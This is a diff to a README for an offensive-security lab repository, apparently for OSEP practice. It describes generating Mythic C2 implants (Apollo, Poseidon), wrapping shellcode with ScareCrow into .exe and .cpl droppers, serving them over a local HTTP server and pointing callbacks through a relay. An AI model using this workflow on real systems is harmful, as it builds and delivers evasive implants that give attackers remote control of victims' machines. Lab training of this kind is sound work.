@@ -82,10 +82,13 @@ cd Mythic-CheatSheet
 cd scripts
 ```
 
-Change password in the script to match your Mythic credentials.  
+Set the Mythic credentials in your shell. The password is intentionally not stored in the template.
 ```
-cd mythicConfig
-nano generatePayloads.py
+export MYTHIC_PASSWORD='your-mythic-password'
+# Optional when Mythic is not on the local default endpoint:
+export MYTHIC_USERNAME='mythic_admin'
+export MYTHIC_SERVER_IP='127.0.0.1'
+export MYTHIC_SERVER_PORT='7443'
 ```
 
 Create a new folder and execute the script with the new IP. 
@@ -103,11 +106,50 @@ python -m http.server 8080 --bind 192.168.45.90
 ```
 > Note: `--bind 192.168.45.90` is to only listen in that interface. 
 
+Generated files are placed in `payloads/`, together with `build-manifest.json` containing the payload UUID and SHA-256 for each build. To build only one direct-C2 family, pass `apollo` or `poseidon` as the fourth argument:
+
+```
+bash /route-to-repo/Mythic-CheatSheet/scripts/generate.sh http://192.168.45.90 8080 80 poseidon
+```
+
+Before a lab run, validate the current exported templates without logging in or creating payloads:
+
+```
+python3 scripts/mythicConfig/generatePayloads.py http://192.168.45.90 80 --dry-run
+```
+
+### Rapid TCP and SMB wrapper builds
+
+The TCP and SMB templates are paired with their ScareCrow wrapper templates. The raw Apollo shellcode is built inside Mythic and immediately used as the wrapper input; only the wrapper artifact is downloaded to `payloads/`.
+
+For a new TCP listener port, run:
+
+```
+export MYTHIC_PASSWORD='your-mythic-password'
+python3 scripts/mythicConfig/generatePayloads.py --mode tcp --tcp-port 47001
+```
+
+This downloads `apollo-tcp-47001-wrapped.exe`. The TCP port is included in the filename so multiple rapid builds cannot be confused. For SMB, run:
+
+```
+python3 scripts/mythicConfig/generatePayloads.py --mode smb
+```
+
+This downloads `apollo-smb.cpl`. The generated `build-manifest.json` records the exact wrapper artifact and its corresponding Mythic payload UUID.
+
 ### Personalizing the Mythic config files
 
 To update the Mythic config files the best option is just crate a Payload using the Mythic web GUI, configuring everything and when the Payload is ready, click `ACTIONS` and `Export Payload Config`. That will download the `apollo.exe.json` config file that can replace the current one. 
 
 > Note: The `apollo.exe.json`  must have that name to be used in the script, next to `apollo.bin.json` and `poseidon-osep.bin.json`. 
+
+The expected direct-C2 template names are `apollo.exe.json`, `apollo.bin.json`, and `poseidon.bin.json`; the P2P/wrapper pairs are `apollo-tcp.bin.json` + `apollo-tcp-wrapped.exe.json` and `apollo-smb.bin.json` + `apollo-smb.cpl.json`. Treat exported files as sensitive: they can include C2 configuration and key material, so keep this repository private and re-export templates after rotating an environment.
+
+### OSEP lab workflow notes
+
+- The Poseidon template enables its `static` build option, which avoids newer glibc requirements on older Linux lab hosts.
+- Confirm the callback path before building. When an internal host cannot reach the Mythic listener directly, use an approved lab relay and set the callback host and port to that relay endpoint.
+- Keep the payload callback port distinct from the local file-serving port; the generator accepts separate values for each.
 
 ![Export Cusom Config](img/export-config.png)
 
